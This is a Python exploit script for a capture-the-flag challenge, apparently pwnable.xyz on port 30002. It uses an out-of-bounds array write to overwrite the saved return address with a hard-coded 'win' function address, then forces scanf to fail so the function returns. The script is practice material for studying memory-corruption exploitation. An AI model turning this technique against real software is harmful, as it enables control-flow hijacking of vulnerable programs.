#!/usr/bin/env python3
import socket
import sys
import time

PROMPT = b"Input:"
WIN_ADDR = 0x400822  # from local disassembly (non-PIE)


def recv_until(sock, token=PROMPT, timeout_sec=3.0):
    sock.settimeout(timeout_sec)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
            if token in b"".join(chunks):
                break
    except socket.timeout:
        pass
    return b"".join(chunks)


def recv_any(sock, timeout_sec=2.0):
    sock.settimeout(timeout_sec)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except socket.timeout:
        pass
    return b"".join(chunks)


def try_connect(host: str, port: int, timeout_sec: float = 5.0):
    try:
        return socket.create_connection((host, port), timeout=timeout_sec)
    except socket.gaierror:
        if host == "svc.pwnable.xyz":
            # Fallback to nmap-resolved IP for this challenge
            return socket.create_connection(("167.71.125.23", port), timeout=timeout_sec)
        raise


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "svc.pwnable.xyz"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 30002

    with try_connect(host, port, 5.0) as sock:
        out = recv_until(sock)
        sys.stdout.buffer.write(out)
        # Overwrite saved RIP at arr[13] with WIN_ADDR by setting (a+b)=WIN_ADDR
        line = f"{WIN_ADDR} 0 13\n".encode()
        sock.sendall(line)
        time.sleep(0.05)
        out = recv_until(sock)  # read 'Result: ...' and next 'Input:'
        sys.stdout.buffer.write(out)
        # Cause scanf("%ld %ld %ld") to fail parsing -> triggers return
        sock.sendall(b"q\n")
        time.sleep(0.05)
        out = recv_any(sock, 3.0)
        sys.stdout.buffer.write(out)

if __name__ == "__main__":
    main()
